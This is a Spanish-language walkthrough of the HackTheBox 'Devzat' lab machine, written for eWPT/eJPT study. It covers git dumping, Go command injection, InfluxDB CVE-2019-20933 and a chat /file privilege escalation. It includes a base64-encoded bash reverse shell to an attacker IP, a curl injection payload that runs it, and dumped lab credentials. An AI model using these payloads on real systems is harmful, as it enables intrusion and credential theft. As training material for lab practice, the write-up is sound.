# Máquina "Devzat" de HackTheBox

## Características

- Linux
- Dificultad media
- Fuzzing de directorio .git (Recomposición de proyecto GIT)
- Inyección web (RCE) abusando de InfluxDB (CVE-2019-20933)
- Abuso del comando /file del chat Devzat (Escalada de privilegios)
- EXTRA (Desafío de criptografía CTF | Factorización N)

## Útil en

- eWPT
- eJPT

**IP:** 10.10.11.118

## Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.118
```

**Resultado del escaneo de Nmap:** Puerto 22, Puerto 80, Puerto 8000. El servicio Apache se está ejecutando en el puerto 80, por lo que sabemos que hay una página web ejecutándose.

```bash
sudo nmap -sC -sV -p22,80,8000 10.10.11.118 -oN targeted
```

## Reconocimiento

Agregamos el nombre y la IP al archivo hosts local:

```bash
nano /etc/hosts
# Agregar: 10.10.11.118 devzat.htb pets.devzat.htb
```

Luego hacemos reconocimiento de directorios con gobuster:

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://devzat.htb/ -t 20 2>/dev/null
```

![Gobuster resultado](/secciones/posts/imagenes/devzat/gobust1.png)

Guardamos todos los directorios encontrados y luego fuzzeamos:

```bash
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://devzat.htb/FUZZ
```

Modificamos el fuzzing para que muestre solo los directorios o recursos con los códigos de estado especificados:

```bash
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://devzat.htb/FUZZ -mc 200,204,301,307,401,403,405
```

## Análisis de la aplicación web

Mientras tanto, accedemos a la web y probamos con el puerto 8000. Vemos una página estilo IRC. Usamos el mismo nombre de usuario en la sección de contacto para acceder al chat. Esto nos proporciona un chat con un administrador que nos informa que existe una base de datos InfluxDB en algún lugar de la máquina.

El fuzzing anterior nos dio algunos recursos, específicamente un directorio `.git` que descargaremos a nuestra máquina.

## Explotación del repositorio Git

Descargamos una herramienta para la investigación de Git:

```bash
git clone https://github.com/internetwache/GitTools
```

Movemos el ejecutable de la herramienta a una carpeta y ejecutamos:

```bash
./GitTools/Dumper/gitdumper.sh http://pets.devzat.htb/.git/ dump
```

## Análisis del código fuente

Analizamos los archivos hasta encontrar el archivo `main.go`.

Después de analizarlo, podemos llegar a la conclusión de que es vulnerable a la inyección de comandos, específicamente en la sección:

```go
func loadCharacter(species string) string {
    cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
    stdoutStderr, err := cmd.CombinedOutput()
    if err != nil {
        return err.Error()
    }
    return string(stdoutStderr)
}
```

## Explotación de la vulnerabilidad

Realizamos una inyección de código. Generamos una shell inversa en base64:

```bash
echo -n "bash -i >& /dev/tcp/10.10.14.13/4484 0>&1" | base64
```

La salida es:
```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDg0IDA+JjE=
```

Este código se agrega al curl:

```bash
curl -v -X POST "http://pets.devzat.htb/api/pet" -d '{"name":"test1","species":"cat;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDg0IDA+JjE= | base64 -d | bash"}'
```

Esto enviará una shell inversa a nuestro puerto 4484. ¡Listo, estamos dentro!

![Acceso obtenido](/secciones/posts/imagenes/devzat/estamosadentro.jpeg)

## Reconocimiento interno

No está la flag, así que buscaremos algunas cosas como claves SSH:

```bash
find / -type f -name "authorized_keys" -ls 2>/dev/null
```

Como Patrick (nuestro usuario actual), buscaremos puertos abiertos:

```bash
netstat -pluton
```

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name     Timer
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
```

Vemos que está abierto el puerto 8086, que usa InfluxDB.

## Reenvío de puertos con Chisel

Descargamos Chisel y lo enviamos a la víctima:

```bash
chmod +x chisel
```

Lanzamos en nuestra máquina:

```bash
chisel server -p 1111 --reverse
```

En la víctima:

```bash
./chisel client 10.10.14.13:1111 R:8086:127.0.0.1:8086
```

Conexión establecida.

## Explotación de InfluxDB

Buscamos una vulnerabilidad asociada a InfluxDB que tiene una vulnerabilidad conocida (CVE-2019-20933) que permite omitir el inicio de sesión. Además, existe un exploit funcional para esta vulnerabilidad en particular.

```bash
git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git
cd InfluxDB-Exploit-CVE-2019-20933
pip install -r requirements.txt
```

```bash
python3 main.py
```

![InfluxDB exploit](/secciones/posts/imagenes/devzat/influx1.png)

Luego ejecutamos:

```sql
SHOW MEASUREMENTS
```

![InfluxDB measurements](/secciones/posts/imagenes/devzat/influx2.png)

Después de ese volcado de usuario:

```sql
select * from "user"
```

![InfluxDB user data](/secciones/posts/imagenes/devzat/influx3.png)

Y tenemos las credenciales:

- **Usuario:** catherine
- **Contraseña:** woBeeYareedahc7Oogeephies7Aiseci

Ingresamos como Catherine y encontramos la flag de usuario.

## Escalada de privilegios

Aquí tenemos archivos zip llamados `devzat-dev.zip` y `devzat-main.zip`, por lo que debemos descomprimirlos en el directorio `/tmp`.

```bash
cp devzat-dev.zip /tmp
```

Desde el comando `diff`, el entorno "dev" implementa la función de lectura de archivos utilizando el comando `file` con protección por contraseña. El entorno "dev" se ejecuta en el puerto localhost 8443. Por lo tanto, desde la enumeración inicial utilizando la cuenta Patrick, no se puede verificar el proceso que se ejecuta en el puerto 8443.

```bash
diff dev/commands.go main/commands.go
```

Ahora es necesario descargar Chisel en el usuario Catherine para el reenvío de puertos:

```bash
chmod +x chisel_1.7.3_linux_amd64
```

Necesitamos reenviar el puerto desde aquí a nuestra propia máquina usando la herramienta que usamos anteriormente (Chisel) y el puerto SSH será 8443.

![Chisel SSH Catherine](/secciones/posts/imagenes/devzat/chiselsshcat.png)

```bash
ssh -l test 127.0.0.1 -p 8443
```

Capturamos la bandera root:

```bash
/file ../root.txt TechoCatStillAThingin2021?
```

¡Máquina terminada!

## Nota

Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes. Esto se debe a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También, si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.